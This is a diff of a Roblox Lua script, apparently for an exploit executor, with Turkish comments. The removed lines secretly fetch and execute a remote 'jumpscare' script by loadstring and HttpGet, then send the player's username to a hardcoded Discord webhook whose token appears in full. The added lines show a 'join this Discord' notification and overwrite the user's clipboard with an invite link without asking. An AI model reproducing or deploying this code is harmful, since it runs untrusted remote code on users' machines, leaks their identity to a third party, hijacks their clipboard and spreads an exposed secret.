@@ -1,83 +1,28 @@
-local randomChance = math.random(1, 1000) -- 1 ile 100 arasında rastgele bir sayı oluşturur
+local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "Pls Join This Dc :3",
+    Text = "Link Copied",
+    Duration = 3,
+    Callback = AllowRunServiceBind,
+})
 
-if randomChance <= 1 then
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-ro0lkidd-jumpscare-script-11136"))()
 wait(1)
-function SendMessage(url, message)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["content"] = message,
-        ["username"] = "webhook mesage"
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-    print("Sent")
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+
+-- Yazy kopyalama
+local function copyTextToClipboard(text)
+    local success, message = pcall(function()
+        -- Windows kopyalama ilemi
+        setclipboard(text)
+    end)
+    if not success then
+        warn("" .. message)
+    end
 end
 
-function SendMessageEMBED(url, embed)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["description"] = embed.description,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = embed.footer.text
-                }
-            }
-        },
-        ["username"] = "PumpkinHead" 
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-    print("Sent")
-end
-
-local player = game.Players.LocalPlayer
-local username = player.Name
-local avatarId = player.UserId
-
-local profileUrl = "https://www.roblox.com/tr/users/" .. avatarId .. "/profile"
-
-local currentTime = os.date("%Y-%m-%d %H:%M:%S") 
-
-local url = "https://discord.com/api/webhooks/1298350799654490193/MbgvE1CSNzdhdgUpcrg-jugMjTYkhWvN-MnhgL_enuRkqUd3FSzlbATMpr9sVgJQMNSo"
-
-
-
-local embed = {
-    ["title"] = "JumpScareAlert",
-    ["description"] = "** LOL Someone Got JumpScare **",
-    ["color"] = 666666,
-    ["fields"] = {
-{
-["name"] = "UserName",
-["value"] = username,
-["inline"] = true
-},
-    },
-    ["footer"] = {
-        ["text"] = "👹👹👹"
-    }
-}
-SendMessageEMBED(url, embed)
-else
-end
+-- Kopyalanacak �rnek metin
+copyTextToClipboard("https://discord.gg/Wb5FQjxF")
